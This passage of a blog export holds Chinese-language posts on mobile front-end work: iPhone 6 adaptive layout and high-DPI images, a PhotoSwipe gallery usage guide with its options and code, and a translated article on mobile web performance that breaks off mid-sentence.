window);页面初始化的时候计算font-size，然后再绑定resize事件。这种效果就和百分比布局一样了。那么用REM做单位与百分比做单位有什么优势？&emsp;&emsp;主要优势在于能更好的控制元素大小。（一般百分比应用在布局层，一般常见设置为50%，33.3%，25%之类的整数居多，难以运用在复杂的页面小部件内）。但是相比百分比布局，需要借助JS或media query实现，略有一点瑕疵。4、图片自适应&emsp;&emsp;刚说完REM布局，那么用百分比布局也能实现一样的效果，但是用百分比布局，必须要面临一个问题：图片宽度100%，页面加载时会存在高度塌陷的问题。.如图：页面加载时图片高度默认不存在。那么可以用padding-top设置百分比值来实现自适应。公式如下：1padding-top = (Image Height / Image Width) * 100%原理：padding-top值为百分比时，取值是是相对于宽度的。相关代码实现：12.cover&#123;position: relative; padding-top: 100%; height: 0; overflow: hidden;&#125;.cover img&#123;position: absolute; top: 0; width: 100%;&#125;5、图片高清化&emsp;&emsp;大家都知道，iphone6 plus 是3倍高清图了，它的devicePixelRatio = 3。 关于DPR的介绍可以查看这篇文章《设备像素比devicePixelRatio简单介绍》&emsp;&emsp;在ios8下，已经开始支持img的srcset 属性了（目前移动端也就ios8开始支持），也就是说，可以对一张图片设置2个URL，浏览器自动加载对应的图片。支持程度如下：黄色表示仅支持旧的srcset规范，绿色表示支持全新的srcset规范，包括sizes属性，w描述符。 这里不展开，详细了解可自行google。如下DEMO，请切换devicePixelRatio值进行查看：不过目前前端这边图片的实现基本都用lazyload的方式实现。srcset的图片加载方式在实际项目中运用还比较少。6、背景图高清化media query 实现高清化&emsp;&emsp;img标签的高清化，可以通过JS判断devicePixelRatio的值来加载不同尺寸的图片，但是对于背景图，写在CSS中的，用JS来判断就略麻烦了，还好CSS通过media query也能判断dpr。&emsp;&emsp;目前兼容性最好的背景图高清化实现方式，使用media query的-webkit-min-device-pixel-ratio做判断：12345678910111213141516/* 普通显示屏(设备像素比例小于等于1)使用1倍的图 */.css&#123;background-image: url(img_1x.png);&#125;/* 高清显示屏(设备像素比例大于等于2)使用2倍图 */@media only screen and (-webkit-min-device-pixel-ratio:2)&#123;.css&#123;background-image: url(img_2x.png);&#125;&#125;/* 高清显示屏(设备像素比例大于等于3)使用3倍图 */@media only screen and (-webkit-min-device-pixel-ratio:3)&#123;.css&#123;background-image: url(img_3x.png);&#125;&#125;进一步，可以通过工具生成相应的3x，2x，1x的图片及css，在使用时直接引用即可。谁搞一个？关于移动设备的-webkit-min-device-pixel-ratio值，可以查看该网页的整理：http://bjango.com/articles/min-device-pixel-ratio/image-set 实现高清化image-set，它是Webkit的私有属性，也是Css4的一个属性，它是为了解决Retina屏幕下的图像显示而生。使用方式也很简单。伪代码如下：12345678.css &#123;background-image: url(1x.png); /*不支持image-set的情况下显示*/background: -webkit-image-set(url(1x.png) 1x,/* 支持image-set的浏览器的[普通屏幕]下 */url(2x.png) 2x,/* 支持image-set的浏览器的[2倍Retina屏幕] */url(3x.png) 3x/* 支持image-set的浏览器的[3倍Retina屏幕] */);&#125;目前移动端的支持程度来看，ios7+，android 4.4+ 下已经支持了。如果仅仅是做ip6+的高清适配方案。image-set也是一种实现方案。使用image-set 与 media query 实现有什么区别及好处？这篇文章里面做了很详细的阐述，大家可以看看：http://blog.cloudfour.com/safari-6-and-chrome-21-add-image-set-to-support-retina-images/&emsp;&emsp;大体的意思是：image-set不需要告诉浏览器使用什么图像，而是直接提供了图像让浏览器选择。这就意味着，如果在低网速下，浏览器可以选择加载低分辨率的图片。（PS：好智能的样子）&emsp;&emsp;但是相比如media query的实现，image-set仅支持单个图片的高清化，不适合在css sprite下使用。 并且兼容性也是一大硬伤。但是一般来说，用在LOGO区域，单个图片图标的区域下，也是个不错的选择。7、图片列表的自适应&emsp;&emsp;关于适配，也就是要让布局更灵活，在电商网站里面，商品列表是一个非常常见的结构。一种比较智能的列表方式是：两端对齐，间距自适应。&emsp;&emsp;那么可以使用FLEXBOX布局来实现两端对齐的效果，也可以使用text-align:justify的方式实现。&emsp;&emsp;先看个flex实现的例子，主要通过justify-content:space-between，来实现：&emsp;&emsp;flexbox的布局方式，在PC端就不合适了，ie9以下都不支持，那么更友好的方式可以使用text-align:justify来实现，兼容各大主流浏览器，包括IE6。详情请移步我以前写的博文：《inline-block + justify实现列表两端对齐》&emsp;&emsp;但是这2种布局方式都有一定的局限性。就是列表个数必须凑整。目前还没找到一种能够兼容不限个数的实现方案，如果各位看官有更好的实现方式，也欢迎提出，一起交流。总结&emsp;&emsp;移动端ip6的适配方案有很多，没有固定的套路及方法，请根据自身业务的特点，选择其中的一些方法组合使用。&nbsp;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>iphone6自适应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于zepto的微信手机端微场景HTML5页面特效]]></title>
    <url>%2F2015%2F07%2F15%2F%E5%9F%BA%E4%BA%8Ezepto%E7%9A%84%E5%BE%AE%E4%BF%A1%E6%89%8B%E6%9C%BA%E7%AB%AF%E5%BE%AE%E5%9C%BA%E6%99%AFhtml5%E9%A1%B5%E9%9D%A2%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;如今非常流行的HTML5页面展现形式，特别是在一些微信应用里面微场景的使用、电子海报等表现方式大都采用如此方式，今天我们提供大家一款这种页面特效，支持手机端触屏向上滑动，页面非常流畅，基于zepto,轻量级框架，大家可以看看。微信扫一扫看效果点此下载&nbsp;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>zepto，微场景，html5特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PhotoSwipe使用简介]]></title>
    <url>%2F2015%2F07%2F14%2Fphotoswipe%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[官方介绍PhotoSwipe 是专为移动触摸设备设计的相册/画廊.兼容所有iPhone、iPad、黑莓6+,以及桌面浏览器.底层实现基于HTML/CSS/JavaScript,是一款免费开源的相册产品。为谁而用让移动站点的相册体验和原生App一样的设计师和开发者。绝佳特性PhotoSwipe提供给用户一个熟悉又直观的相册交互界面。官方网站http://www.photoswipe.com/源码示例http://github.com/downloads/codecomputerlove/PhotoSwipe/code.photoswipe-3.0.5.zipGithubhttps://github.com/codecomputerlove/PhotoSwipe在线demohttp://www.photoswipe.com/latest/examples/04-jquery-mobile.html兼容特性PhotoSwipe兼容大量的移动设备以及所有流行的JavaScript类库/开发框架. 既有基于jQuery的版本,也有不依赖jQuery的版本，还有兼容jQuery Mobile的版本。当然，All In One，全在源码示例包里。如何使用PhotoSwipe是一个自身独立的JavaScript库，可以很方便地集成进你的网站。针对移动浏览器(webkit)进行了大量的优化,当然，对于桌面浏览器，以及jQueryMobile，在源码包内也提供了相应的版本.类库引用1234&lt;!-- photoswipe 之前先引用klass,如果需要提高加载速度,可以给 script 加上 defer 标记/属性--&gt;&lt;script type="text/javascript" src="klass.min.js"&gt;&lt;/script&gt;&lt;!-- 重要提示,如果不使用jQuery版本，在IE下面会出错，当然，使用jQuery版本，则需要引入jQuery--&gt;&lt;script type="text/javascript" src="code.photoswipe-3.0.5.min.js"&gt;&lt;/script&gt;调用代码12345678910/* 添加DOMContentLoaded 事件监听,类似于jQuery的 ready函数.默认方式 examples/01-default.html无缩略图模式请查看.examples/09-exclusive-mode-no-thumbnails.html*/// PhotoSwipe.attach 方法接收3个参数(HTML元素集合,可选配置信息,可选多实例时string类型的ID)document.addEventListener('DOMContentLoaded', function()&#123;//设置 PhotoSwipe绑定为 id为Gallery的容器下的所有&lt;a&gt;标签.点击就会激活// 此处的对象，就是PhotoSwipe实例，可以使用相应的方法,例如 show(0),hide()等.var myPhotoSwipe = Code.PhotoSwipe.attach( window.document.querySelectorAll('#Gallery a'), &#123; enableMouseWheel: false , enableKeyboard: false &#125; );&#125;, false);如果使用jQuery，则调用代码如下：123456//jQuery 版,对应的js文件也需要变化// 示例详见examples/02-jquery.html$(document).ready(function()&#123;// 此处的对象，就是PhotoSwipe实例，可以使用相应的方法,例如 show(0),hide()等.var myPhotoSwipe = $("#Gallery a").photoSwipe(&#123; enableMouseWheel: false , enableKeyboard: false &#125;);&#125;);HTML代码123456789&lt;!-- ul li 之类是用于显示缩略图的,也可以根据需要调整.&lt;a&gt;下面的&lt;img&gt; 元素,即为缩略图,如果不需要，则src设置为空即可 --&gt;&lt;ul id="Gallery"&gt;&lt;li&gt;&lt;a href="images/full/01.jpg"&gt;&lt;img src="images/thumb/01.jpg" alt="Image 01" /&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="images/full/02.jpg"&gt;&lt;img src="images/thumb/02.jpg" alt="Image 02" /&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="images/full/03.jpg"&gt;&lt;img src="images/thumb/03.jpg" alt="Image 03" /&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="images/full/04.jpg"&gt;&lt;img src="images/thumb/04.jpg" alt="Image 04" /&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="images/full/05.jpg"&gt;&lt;img src="images/thumb/05.jpg" alt="Image 05" /&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="images/full/06.jpg"&gt;&lt;img src="images/thumb/06.jpg" alt="Image 06" /&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;参数说明12345678910111213141516171819202122232425262728293031323334353637383940allowUserZoom: 允许用户双击放大/移动方式查看图片. 默认值 = trueautoStartSlideshow: 当PhotoSwipe激活后,自动播放幻灯片. 默认值 = falseallowRotationOnUserZoom: 只有 iOS 支持 - 允许用户在缩放/平移模式下 用手势旋转图像. 默认值 = falsebackButtonHideEnabled: 按返回键隐藏相册幻灯片. 主要是 Android 和 Blackberry使用. 支持 BB6, Android v2.1, iOS 4 以及更新版本. 默认值 = truecaptionAndToolbarAutoHideDelay: 标题栏和工具栏自动隐藏的延迟时间. 默认值为 = 5000(毫秒). 如果设为 0 则不会自动隐藏(tap/单击切换显隐)captionAndToolbarFlipPosition: 标题栏和工具栏切换位置(让 caption显示在底部而 toolbar显示在顶部). 默认值 = falsecaptionAndToolbarHide: 隐藏 标题栏和工具栏. 默认值 = falsecaptionAndToolbarOpacity: 标题栏和工具栏 的透明度(0-1). 默认值 = 0.8captionAndToolbarShowEmptyCaptions: 即使当前图片的标题是空,也显示标题栏. 默认值 = truecacheMode: 缓存模式,Code.PhotoSwipe.Cache.Mode.normal (默认,正常) 或者 Code.PhotoSwipe.Cache.Mode.aggressive(激进,积极). 决定 PhotoSwipe 如何管理图片缓存 cache.Aggressive 模式将会积极地地设置非 "当前，上一张,下一张"的图片为空的类型. 对于老版本iOS 浏览器下的大图片内存溢出将会很有用. 大多数情况下，normal模式就可以了。doubleTapSpeed: 双击的最大间隔. 默认值 = 300(毫秒)doubleTapZoomLevel: 当用户双击的时候,放大的倍数, 默认的 "zoom-in"(拉近) 级别. 默认值 = 2.5enableDrag: 允许拖动上一张/下一张图片到当前界面. 默认值 = trueenableKeyboard: 允许键盘操作(左右箭头切换，Esc退出,Enter自动播放,空格键 显/隐标题栏/退出). 默认 = trueenableMouseWheel: 允许鼠标滚轮操作. 默认 = truefadeInSpeed: 淡入效果元素的速度(持续时间),毫秒. 默认 = 250fadeOutSpeed: 淡出效果元素的速度(持续时间),毫秒. 默认 = 250imageScaleMethod: 图片缩放方法(模式). 可选值: "fit", "fitNoUpscale" 和 "zoom". 模式"fit" 保证图像适应屏幕. "fitNoUpscale" 和 "fit"类似但是不会放大图片. "zoom"将图片全屏, 但有可能图片缩放不是等比例的. 默认 = "fit"invertMouseWheel: 反转鼠标滚轮。默认情况下,鼠标向下滚动将切换到下一张,向上切换到上一张 . 默认 = falsejQueryMobile: 指示 PhotoSwipe 是否集成进了 jQuery Mobile 项目. 默认情况下, PhotoSwipe will try and work this out for youjQueryMobileDialogHash: jQuery Mobile的window,dialog页面 所使用的hash标签。 默认值 = "&amp;amp;ui-state=dialog"loop: 相册是否自动循环. 默认 = truemargin: 两张图之间的间隔,单位是像素. 默认 = 20maxUserZoom: 最大放大倍数. 默认 = 5.0 (设置为0将被忽略)minUserZoom: 图像最小的缩小倍数. 默认 = 0.5 (设置为0将会忽略)mouseWheelSpeed: 响应鼠标滚轮的灵敏度. 默认 = 500(毫秒)nextPreviousSlideSpeed: 当点击上一张,下一张按钮后,延迟多少毫秒执行切换. 默认 = 0 (立即切换)preventHide: 阻止用户关闭 PhotoSwipe. 同时也会隐藏 工具栏上的"close"关闭按钮. 在独享的页面使用 (示例是源码中的 examples/08-exclusive-mode.html). 默认 = falsepreventSlideshow: 阻止自动播放模式. 同时也会隐藏工具栏里的播放按钮. 默认 = falseslideshowDelay: 自动播放模式下，多长时间播放下一张. Default = 3000(毫秒)slideSpeed: 图片滑进视图的时间. 默认 = 250(毫秒)swipeThreshold: 手指滑动多少像素才触发一个 swipe 手势事件. 默认 = 50swipeTimeThreshold: 定义触发swipe(滑动)手势的最大毫秒数,太慢了则不会触发滑动，只会拖动当前照片的位置. 默认 = 250slideTimingFunction: 滑动时的 Easing function . 默认 = "ease-out"zIndex: 初始的zIndex值. 默认 = 1000enableUIWebViewRepositionTimeout: 检查设备的方向是否改变。默认 = falseuiWebViewResetPositionDelay: 定时检查设备的方向是否改变的时间 默认 = 500(毫秒)preventDefaultTouchEvents: 阻止默认的touch事件，比如页面滚动。 默认 = truetarget: 必须是一个合法的DOM元素(如DIV)。默认是window(全页面)。而如果是某个低级别的DOM，则在DOM内显示，可能非全屏。自定义函数1234567891011121314151617181920212223getToolbar: function()&#123;/*返回 要在Toolbar之中显示的HTML字符串*/&#125;,getImageSource: function(el)&#123;/* 告诉 gallery如何获取图片的src,默认情况下,gallery假设你使用&lt;a&gt;标签包装了&lt;img&gt;缩略图，而&lt;a&gt;标签的href属性即为完整图片的URL。此时可以使用本方法来返回对应元素的图片的路径。可以是各种各样的。比如rel属性什么的。有jQuery那就更简单了。*/return el.getAttribute('rel');&#125;,getImageCaption: function(el)&#123;/**如同 getImageSource 方法一样，此方法返回图片的标题，默认情况下gallery查找图片的alt 属性。*/&#125;,getImageMetaData: function(el)&#123;/**如果你监听了 onDisplayImage,那么你可以通过此函数获取额外的元信息.并在 onDisplayImage中使用*/return &#123;longDescription: el.getAttribute(el, 'data-long-description')&#125;&#125;针对android 手机一次点按，会引起一层关闭后,底上的层依然会触发点击事件的问题，我们的解决方案如下:1234567891011121314151617181920212223242526272829303132333435363738394041// 在android 手机上多个层次触发点击,我们采用的是用定时器进行拦截var event_timeout = 500;// 预防多次事件触发// 阻止短时间内连续事件var multiClickPrevent = false;function preventMultiClick()&#123;if(multiClickPrevent)&#123;return false;&#125;multiClickPrevent = true;window.setTimeout(function()&#123;multiClickPrevent = false;&#125;,event_timeout);return true;&#125;;// 适配浏览器var useragent = navigator.userAgent;var likeIOS = useragent.match(/iPad|iPhone|iPod/i);var likeAndroid = useragent.match(/android/i);var specialClick = "click";if(likeIOS)&#123;specialClick = "touchstart click";&#125; else if(likeAndroid)&#123;specialClick = "touchstart click";&#125;// 示例$(".t_right").live(specialClick,function()&#123;if(preventMultiClick())&#123;// 执行其他操作&#125; else &#123;// else 就是拒绝操作啦,可以直接返回 false 之类的return false;&#125;&#125;);// 示例$("body").live(specialClick,function()&#123;if(preventMultiClick())&#123;// 执行其他操作&#125;&#125;);]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>PhotoSwipe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动网站性能优化：网页加载技术概览]]></title>
    <url>%2F2015%2F07%2F14%2F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%9A%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;由于移动设备存在的环境限制，如低带宽，高延迟，小内存，低处理器性能的等，迫使开发者不得不想办法通过优化前端页面的性能来满足用户的性能预期。在强调如何解决移动端性能问题上，这篇文章总结了一些前端优化的案例，并且概括了一些加速页面的方法和策略。为什么性能会影响这么多&emsp;&emsp;不论你的页面设计地多么有趣、漂亮、交互性好，不管是在桌面还是移动设备上，如果页面需要花2到3秒时间去渲染展示，那么用户都会很快变得不耐烦的。可以预期的是，在页面还在加载的时候，用户很有可能从浏览购买的行为转变为点击回退键或者是关闭浏览器的行为。&emsp;&emsp;不到1秒钟的延迟甚至也会显著地影响收入。在2006年，当时还在Google工作的Marissa Mayer说，由于用户表示希望在一个搜索页上看到多于10个搜索结果，Google就实验性地修改为30个。但是让人吃惊的是，在这个实验里，流量和投资都减少了20个百分点，显然是由于更多的搜索结果导致多花费了半秒时间来加载页面。^5&emsp;&emsp;用户的期望总是在不断的提升。2009年，Forrester研究所的Akamai的一项研究发现表明，网页响应时间可容忍的阀值是2秒，一旦网页相应时间超过3秒，会有40%的用户放弃浏览页面。一年之后，Akamai的另一项研究表明，超过3秒放弃浏览页面的用户比例上升到了57%。^1,7&emsp;&emsp;此外，移动端的用户希望移动设备上的页面性能不亚于桌面PC。由Tealeaf科技（现在已经并入IBM）委托的“Harris的互动2011移动交互调查”显示，在前一年有过移动消费经历的成年人中，有85%希望移动设备上的体验能与手提电脑或者PC上的体验相当，甚至于更好。并且有63%的人表示，一旦他在移动设备上的交易遇到了一个问题，他们就不会再想通过其他渠道去购买这个公司的其他产品了。^10换句话说，差劲的移动页面性能会影响到公司其他各种平台的销售，这其中当然也包括线下的实体店。&emsp;&emsp;移动流量正在迅速增长。对许多消费者而言，他们的手机或者平板设备已经成为他们浏览网络的主要入口了，但是其性能表现却差强人意。2011年2月，Compuware公司委托Equation 研究所做的一项研究表明，几乎一半的移动用户（46%）表示他们手机上的网站加载速度过慢。60%的用户希望页面能在3秒或者更少的时间内加载完成，74%的用户表示，当单个页面加载时间花费5秒或者更多的时候，他们会选择离开这个页面。在2012年，由Strangeloop网络（现已并入Redware）发起的一项针对200家领先的电子商务网站研究表明，3G网络环境下，平均加载时间为11.8秒（图1），而在LTE（4G）环境下，加载时间只有轻微的改善，为8.5秒。^8移动设备表现性能的三种影响因素&emsp;&emsp;正如上文所说的，移动设备天生有下面三种性能限制：带宽低，内存小，处理器性能低。这些性能挑战又加上一些其他的问题，例如：网页比以前更大&emsp;&emsp;根据HTTP Archive网站的分析，现在平均的一个web页面需要加载超过1MB的数据，其中包含有图片，javascript，CSS（Cascading Style Sheets）等。更大的网页会影响桌面PC的显示性能。对于移动端的性能 — 特别是3G环境下的性能 — 影响更严重。这个影响会在今后的三年更加明显。以现在的页面增长速度来说，到2015年，平均的页面大小会达到2MB。延迟相差巨大&emsp;&emsp;对LTE来说，延迟大概有34ms，对3G来说，延迟大概有350毫秒甚至更多。移动端的延迟性唯一不变的就是延迟时间永远是不定的，即使是在同一个地点，每次的延迟都是不定的。这是由于大量的数据是通过信息塔进行传输的。因此诸如天气，甚至是持有者所面向的方向都有可能成为影响因素。下载速度相差巨大&emsp;&emsp;下载速度的范围从3G环境下的1Mbps到LTE环境下的31Mbps。把这个和美国平均的带宽15Mbps相比是一个很有意思的事情，3G环境比平均带宽慢了15倍，而LTE却能达到平均带宽的2倍那么快。M.SITES并不能完全解决移动端性能的问题。&emsp;&emsp;许多网站建设者尝试针对多用户访问，大网页和低流量连接的访问页面，开发出短小，快速，精简的m.sites；但是，这些尝试并没有什么用，当用户有选择权的时候，高达35%的移动用户会选择浏览完整的网站。&emsp;&emsp;这些选择浏览完整网站的用户显然比浏览m.sites的用户更有购买欲望。一个研究表明，移动端每$7.00的消费中，有$5.50是来自于网站的网站浏览，只有$1.00是来自于m.sites，剩下的$0.50则是来自于客户端。解决问题&emsp;&emsp;改善网站性能的主要策略并没有因为从PC变成手机或者平板设备而有变化，只是会参杂一些小的策略。&emsp;&emsp;不论在PC还是在移动浏览器上，页面展示需要的时间里，只有20%是用来读取页面的html的。剩下的80%是用来加载额外的像样式表、脚本文件、或者图片这样的资源和执行客户端的程序。三个主要的改善性能的策略是：减少每个页面需要获取额外资源的HTTP请求数减少每个请求加载的大小优化客户端执行的优先级和脚本执行的效率由于移动网络通常比桌面机器的网络慢，所以减少请求数和请求加载量是非常重要的。由于移动端的浏览器解析HTML和执行JavaScript的效率比桌面PC低，所以优化客户端程序也是非常关键的。另外，移动端浏览器的缓存大小比桌面PC低，所以需要有方法能重复利用本地的缓存资源。&emsp;&emsp;文章剩余部分总结了能解决这些问题的方法。虽然这些方法大都可以自动化解决，当然也可以由有经验的前端工程师来手动解决。关键就是要知道人工解决这些技术的方法如何控制资源的请求。通常在CMS（内容管理系统）或者其他Web应用中，有些页面包含一些自动生成好的或者离线的HTML片段、CSS或者Javascript文件，这样的页面开发者就不需要去优化它们了。减少请求&emsp;&emsp;最大的性能漏洞就是一个页面需要发起几十个网络请求来获取诸如样式表、脚本或者图片这样的资源。这个在相对低带宽和高延迟的移动设备连接上来说影响更严重。CDNs（内容分发网络）把资源放在离用户地理位置更近的地方对解决这个问题能起到很大作用，但是比起获取请求，大量的请求对页面加载时间的影响更为严重。而且最近的发现表明，CDNs对移动端用户的性能影响越来越低。下面的章节讨论了简化HTTP请求的几种方法。整合资源&emsp;&emsp;对开发者来说，将Javascript代码和CSS样式放到公共的文件中供多个页面共享是一种标准的优化方法。这个方法能很简单的维护代码，并且提高客户端缓存的使用效率。&emsp;&emsp;在Javascript文件中，要确保在一个页面中相同的脚本不会被加载多次。当大团队或者多个团队合作开发的时候，这种冗余的脚本就很容易出现。你可能会对它的发生频率并不低感到非常吃惊。&emsp;&emsp;Sprites是css中处理图片的一项技术。Sprites就是将多张图片整合到一个线性的网状的大图片中。页面就可以将这个大图片一次性获取回来并且做为css的背景图，然后使用css的背景定位属性展示页面需要的图片部分。这种技术将多个请求整合成一个，能显著地改善性能。&emsp;&emsp;实现小贴士：平稳地改进但是需要对资源有控制权限。根据开发者的网站不同权限，一些资源并不需要被整合起来（例如，一些由CMS生成的资源）。还有，对于一些外部域引用的资源，强行整合可能会导致问题。需要注意的是，整合资源对手机浏览器来说是一把双刃剑。整合资源确实会在首次访问减少请求，但是大的资源文件可能会导致缓存失效，所以，需要小心地使用各种技术整合资源，以达到优化本地存储的目的。使用浏览器缓存和本地缓存&emsp;&emsp;现在所有的浏览器都会使用本地资源去缓存住那些被Cache-Control或者Expires头标记的资源，这些头能标记资源需要缓存的时间。另外，ETag（实体标签）和Last-Modified头来标识当资源过期后是否需要重新请求。浏览器为了减少不必要的服务器请求，尽可能地从本地缓存中获取资源，并且将那些已经过期的、或者当缓存空间减小的时候将那些很久不用的资源进行清理。浏览器缓存通常包括图片，CSS，Javascript代码，这些缓存能合理地提高网站的性能。（比如为了支持后退和前进的按钮，使用一个单独的缓存来保存整个渲染的页面）。&emsp;&emsp;移动浏览器缓存，通常是比桌面PC小的多，这就导致了缓存的数据会很经常被清理。HTML5的缓存基于浏览器缓存提供了一个很好的替换方案。Javascript的localStorage已经在所有主流的桌面和移动端浏览器上都实现了。使用脚本代码能简便地支持HTML5的localStorage操作，可以读写键值数据，每个域名大概有5MB的容量。虽然不同的移动浏览器上读写速度相差很大，但是localStorage大容量的缓存使得它很适合作为客户端的缓存。从localStorage获取资源明显快于从服务器上获取资源，而且在大多数移动设备上也比依靠缓存头或者浏览器的本地缓存更灵活可靠。这是移动浏览器比桌面PC更有优势的一个地方，在桌面PC上，本地缓存仍然优先使用标准的浏览器缓存，导致桌面PC本地缓存的性能落后于移动浏览器。实现小贴士：&emsp;&emsp;需要进一步考虑。虽然localStorage的机制易于实现，但是它的一些控制机制却是非常复杂的。你需要考虑到缓存带给你的所有问题，比如缓存失效（什么时候需要删除缓存？），缓存丢失（当你希望数据在缓存中的时候它并不在怎么办？），还有当缓存满的时候你怎么办？首次使用的时候在HTML中嵌入资源&emsp;&emsp;HTML的标准是使用链接来加载外部资源。这使得更容易在服务器上（或者在CDN上）操作更新这些资源，而不是在每个页面上修改更新这些资源。根据上文讨论的，这种模式也使得浏览器能从本地缓存而不是服务器上获取资源。&emsp;&emsp;但是对还没有缓存到浏览器localStorage的资源来说，这种模式对网站的性能有负面的影响。一般来说，一个页面需要几十个单独的请求来获取资源从而渲染页面。所以说，从性能的角度来说，如果一个资源没有很高的被缓存的几率的话，最好把它嵌入到页面的HTML中（叫inlining），而不是使用链接外部。脚本和样式是支持内嵌到HTML中的，但是图片和其他的二进制资源其实也是可以通过内嵌包含base64编码的文本来嵌入到HTML中的。&emsp;&emsp;内嵌的缺点是页面的大小会变得非常大，所以对于Web应用来说，关键的是能够跟踪分析这个资源什么时候需要从服务端获取，什么时候已经缓存到客户端了。另外，在第一次请求资源后必须能够使用代码在客户端缓存资源，因此，在移动设备上，使用HTML5 localStorage能很好地做到内嵌。实现小贴士：&emsp;&emsp;平稳处理。由于不知道用户是否已经访问过这个页面了，所以需要网站有机制能生成不同版本的页面。使用HTML5服务端发送事件&emsp;&emsp;Web应用已经使用了各种从服务器上轮询资源的方法来持续地更新页面。HTML5的EventSource对象和Server-Sent事件能通过浏览器端的JavaScript代码打开一个服务端连接客户端的单向通道。服务端可以使用这个写通道来发送数据，这样能节省了HTTP创建多个轮询请求的消耗。这种方式比HTML的WebSocket更高效。WebSocket的使用场景是，当有许多客户端和服务端的交互的时候（比如消息或者游戏），在全双工连接上建立一个双向通道。实现小贴士：&emsp;&emsp;需要进一步考虑。这个技术是基于具体的技术实现的。如果你的网站当前是使用其他的Ajax或者Comet技术来轮询的，转变成Server-Sent 事件需要重构网站的Javascript代码。消除重定向&emsp;&emsp;当用户在一个移动设备上访问桌面PC网站的时候，Web网站应用通常读取HTTP的user-agent头来判断这个用户是否是来自移动设备的。然后应用会发送带有空HTTP body和重定向HTTP地址头的HTTP 301（或者302）请求，把用户重定向到网站的移动版本上去。但是，这个额外的客户端和服务端的交互通常在移动网络上会消耗几百毫秒。因此，在原先的请求上传递移动的web页会比传递一个重定向的信息并让客户端再请求移动页面更快。&emsp;&emsp;对于那些想要在移动设备上看桌面PC网站的用户来说，你可以在移动web页面上提供一个链接入口，这样也能同时表示你的网站是并不提倡这种行为的。实现小贴士：&emsp;&emsp;虽然这个技术在理论上是简单的，但是实际上并不易于实施。由于有些m.sites是宿主在其他地方的，所以许多网站会选择重定向到一个不同的服务器上。有的网站则是会在重定向请求的时候种植上Cookie告诉Web应用这个用户是在使用移动设备。这种方法可能对web应用来说更容易控制。减少资源负载&emsp;&emsp;大小问题。渲染小页面更快，获取小资源也更快。减小每个请求的大小通常不如减少页面请求个数那么显著地提高性能。但是，有些技术在性能方面，特别是在需要对带宽和处理器性能精打细算的移动设备环境下，仍然是能带来很大利益的。压缩文本和图像&emsp;&emsp;诸如gzip这样的压缩技术，依靠增加服务端压缩和浏览器解压的步骤，来减少资源的负载。但是，一般来说，这些操作都是被高度优化过了。而且测试表明，压缩对网站还是起到优化性能的作用的。那些基于文本的响应，包括HTML，XML，JSON（Javascript Object Notation），Javascript，和CSS可以减少大约70%的大小。&emsp;&emsp;浏览器在Accept-Encoding请求头中申明它的解压缩技术，并且当它们接收到服务端返回的Content-Encoding响应头标示的时候，就会按照这个响应头自动做解压操作。实现小贴士：&emsp;&emsp;易于实现。如果设置正确的话，现在所有的Web服务器都支持压缩响应。但是，也有一些桌面PC的安全工具会将请求头中的Accept-Encoding头去掉，这样即使浏览器支持解压缩，用户也无法获取到压缩后的响应。代码简化&emsp;&emsp;简化通常是使用在脚本和样式文件中，删除一些不必要的字符，比如空格，换行符，或者注释等。不需要暴露给外部的命名就可以被缩短为一个或者两个字符，比如变量名。合适的简化资源通常在客户端不需要做任何其他的处理，并且平均减少20%的资源大小。内嵌在HTML中的脚本和样式文件也是可以精简的。有很多很好的库来做精简化的操作，这些库一般也同时会提供合并多个文件这样减少请求数的服务。&emsp;&emsp;简化带来的好处并不局限于减少带宽和延迟，对于那些移动设备上缓存无法保存的过大资源来说，也是很有改善的。Gzip在这个方面并没有任何帮助，因为资源是在被解压后才被缓存起来的。实现小贴士：&emsp;&emsp;易于实现。Google的Closure Compiler已经难以置信地完成了理解和简化Javascript的工作。但是CSS的简化则没有那么容易，因为对不同浏览器来说有不同的CSS技术能迷惑CSS简化工具，然后让CSS简化后无法正常工作。必须要注意的是，已经有这样的案例了，即使只是删除了不必要的字符，简化工作也有可能破坏页面。所以当你应用简化技术之后，请做一下完整的功能测试工作。调整图片大小&emsp;&emsp;图片通常是占用了Web页面加载的大部分网络资源，也占用了页面缓存的主要空间。小屏幕的移动设备提供了通过调整图片大小来加速传输和渲染图片资源的机会。如果用户只是在小的移动浏览器窗口中看图片的话，高分辨率的图片就会浪费带宽、处理时间和缓存空间。&emsp;&emsp;为了加速页面渲染速度和减少带宽及内存消耗，可以动态地调整图片大小或者将图片替换为移动设备专用的更小的版本。不要依靠浏览器来将高分辨率的图片转换成小尺寸的图片，这样会浪费带宽。&emsp;&emsp;另外一个方法是先尽快加载一个低分辨率的图片来渲染页面，在onload或者用户已经开始和页面交互以后将这些低分辨率的图片替换成为高分辨率的图片。实现小贴士：特别应用在高度动态化的网站是有优势的。使用HTML5和CSS 3.0来简化页面&emsp;&emsp;HTML5包括了一些新的结构元素，例如header，nav，article和footer。使用这些语义化的元素比传统的使用div和span标签能使得页面更简单和更容易解析。一个简单的页面更小加载更快，并且简单的DOM（Document Object 